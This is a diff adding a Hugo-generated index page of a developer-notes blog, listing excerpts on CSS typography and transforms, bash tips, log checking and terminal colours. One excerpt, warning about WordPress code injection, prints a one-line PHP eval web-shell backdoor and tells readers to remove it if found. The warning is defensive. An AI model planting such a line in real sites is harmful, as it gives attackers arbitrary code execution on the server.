@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta name="generator" content="Hugo 0.26" />
+
+  <title>TLDR Dev Notes</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href=/css/blackburn.css>
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="TLDR Dev Notes" href="/index.xml" />
+  
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/androidstudio.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/yaml.min.js"></script>
+  
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon" />
+
+  
+  
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+  <a class="pure-menu-heading brand" href="/">TLDR Dev Notes</a>
+
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/post/"><i class='fa fa-list fa-fw'></i>All Notes</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/about/"><i class='fa fa-user fa-fw'></i>About</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="/index.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/AamnahAkram" target="_blank"><i class="fa fa-twitter-square fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://instagram.com/AamnahAkram" target="_blank"><i class="fa fa-instagram fa-fw"></i>Instagram</a>
+    </li>
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://pinterest.com/*" target="_blank"><i class="fa fa-pinterest-square fa-fw"></i>Pinterest</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/*" target="_blank"><i class="fa fa-linkedin-square fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/yoshiharuyamashita" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://bitbucket.org/*" target="_blank"><i class="fa fa-bitbucket-square fa-fw"></i>Bitbucket</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://stackoverflow.com/users/*" target="_blank"><i class="fa fa-stack-overflow fa-fw"></i>Stack Overflow</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://serverfault.com/users/*" target="_blank"><i class="fa fa-server fa-fw"></i>Server Fault</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+
+  <div>
+  <div class="small-print">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>TLDR Dev Notes</h1>
+  <h2>Aamnah&#39;s Developer Notes</h2>
+</div>
+
+<div class="content">
+  
+    <article>
+  <header>
+    <h2><a href="/post/_css-sass/css-styling-tips/">CSS Style Notes</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Typography Responsive Typography x
+Use calc and vw to your advantage. calc let&rsquo;s you easily calculate values based on unknown variables like percentages and ems and vw is the width of the viewport at any given time. One viewport unit is 1% (1/100th) of the viewport size.
+body { font-size: calc(14px + .3vw); }  Here 14px is going to be the smallest font size and it&rsquo;s going to increase with the width of the viewport (screen).
+  </p>
+
+  
+  <footer>
+    <a href="/post/_css-sass/css-styling-tips/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+  
+    <article>
+  <header>
+    <h2><a href="/post/_css-sass/css-transitions/">CSS Transitions</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+   Links  Codrops: CSS Reference - Transitions  
+  </p>
+
+  
+</article>
+
+  
+    <article>
+  <header>
+    <h2><a href="/post/_css-sass/css-transforms-and-transitions/">CSS Transitions and Transforms</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+   Transforms transform lets you modify the visual appearance (coordinate space) of css elements. Elements can be translated, rotated, scaled, and skewed
+Examples Scale (resizes elements) Scale the .box by increasing it 20 times it&rsquo;s original size. Value is in percentage
+.box { width: 20px; height: 20px; transform: scale(20); }  Translate (moves elements) Skew Rotate center an element
+/* center the element */ top: 50%; left: 50%; transform: translate(-50%, -50%);  Links  MDN: transform  
+  </p>
+
+  
+</article>
+
+  
+    
+  
+    <article>
+  <header>
+    <h2><a href="/post/bash-scripting/check-if-program-installed/">Check if a program is installed</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  They key is in using hash or type to see if a command is available. For example, the output of
+hash nano  will change based on whether nano is installed or not. If nano is installed, you&rsquo;ll get nothing. If nano is not installed, you&rsquo;ll get an error.
+So, we check for an error to see if something is not installed.
+command -v foo &gt;/dev/null 2&gt;&amp;1 || { echo &gt;&amp;2 &quot;I require foo but it's not installed.
+  </p>
+
+  
+  <footer>
+    <a href="/post/bash-scripting/check-if-program-installed/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+  
+    <article>
+  <header>
+    <h2><a href="/post/_sysadmin/check-log-files/">Checking log files</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Logs directory The common directory for logs is /var/log. Programs tend to save their logs in their own subdirectories under /var/log/. For example:
+ Apache: /var/log/apache2 MySQL: /var/log/mysql  Monitoring logs Get n number of lines from the end of the file with tail -n To check log files, tail is better than cat. cat will dump the whole log file to the console, good luck scrolling. tail -20 will print only the last 20 lines of the file.
+  </p>
+
+  
+  <footer>
+    <a href="/post/_sysadmin/check-log-files/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+  
+    <article>
+  <header>
+    <h2><a href="/post/_sysadmin/code-injection-attacks/">Code Injection Attacks in WordPress</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  tl;dr: If you find this line of code in any files of your WordPress install, get worried, get rid of it immediately.
+&lt;?php @eval($_POST['@01']);?&gt;   With this line of code, the hacker will be able to execute any code he wants. Therefore this code will have the power to read, update or delete any data he wants.
+We don&rsquo;t know yet what code he will choose to execute because the code will be passed as a $_POST argument.
+  </p>
+
+  
+  <footer>
+    <a href="/post/_sysadmin/code-injection-attacks/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+  
+    <article>
+  <header>
+    <h2><a href="/post/_webdev/2014-09-21-code-comparison/">Code comparison</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  I&rsquo;m one of those folks who are learning multiple programming languages at the same time. I occassionally wonder how the same program would be written in another language. It so happens that i&rsquo;m also at the same time learning multiple human languages (French and Arabic) and i do the same thing with them. I wonder how the same sentence would be writtten in another language. It&rsquo;s good for my learning and it&rsquo;s fun to look up things i already know and find a new meaning.
+  </p>
+
+  
+  <footer>
+    <a href="/post/_webdev/2014-09-21-code-comparison/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+  
+    <article>
+  <header>
+    <h2><a href="/post/bash-scripting/coloured-output/">Colored Output</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Start=`\033[` Color=`0;32m` Close=`0m`  \033[0;32 marks the beginning of color and \0333[0m marks the end.
+What you do is:
+echo -e &quot;\033[0;32m This text is green \033[0m&quot;  echo -e &quot;${StartColor} This text is green ${StartClose}&quot;  NOTE: When referencing variables inside an echo, the -e flag is important. So are the double quotation marks &quot;
+In Bash, the &lt;Esc&gt; character can be obtained with the following syntaxes:
+ \e \033 \x1B  http://misc.
+  </p>
+
+  
+  <footer>
+    <a href="/post/bash-scripting/coloured-output/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+  
+    <article>
+  <header>
+    <h2><a href="/post/_linux/2014-08-26-coloring-the-mac-terminal/">Coloring the Mac Terminal</a></h2>
+
+    <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>01 Jan 0001, 00:00</time>
+  </div>
+
+  
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="/tags/bash">bash</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="/tags/macos">macos</a>
+    
+  </div>
+  
+  
+
+</div>
+
+  </header>
+
+  <p>
+  Adding colors to ls and tree Enabling Colors Edit ~/.bash_profile or ~/.profile and add the following two lines:
+export CLICOLOR=1 export LSCOLORS=ExFxCxDxBxegedabagacad  you can use this if you are using a black background:
+export LSCOLORS=gxBxhxDxfxhxhxhxhxcxcx  LSCOLORS=&quot;ExGxBxDxCxEgEdxbxgxcxd&quot; will emulate the default colouring on the linux ls command.
+Making it permanent You can add
+alias ls='ls -Gp' alias tree=&quot;tree -C&quot;  to your ~/.bash_profile to ALWAYS get colored ls and tree output.
+  </p>
+
+  
+  <footer>
+    <a href="/post/_linux/2014-08-26-coloring-the-mac-terminal/">Read more<i class="fa fa-angle-double-right fa-fw"></i></a>
+  </footer>
+  
+</article>
+
+  
+
+  
+
+
+<nav class="pagination" role="pagination">
+  
+  <a href="/page/15/"><i class="fa fa-chevron-left"></i></a>
+  
+  <span>&nbsp;16 / 35&nbsp;</span>
+  
+  <a href="/page/17/"><i class="fa fa-chevron-right"></i></a>
+  
+</nav>
+
+
+
+</div>
+
+</div>
+</div>
+<script src="/js/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'Your Google Analytics tracking ID', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+</body>
+</html>
+
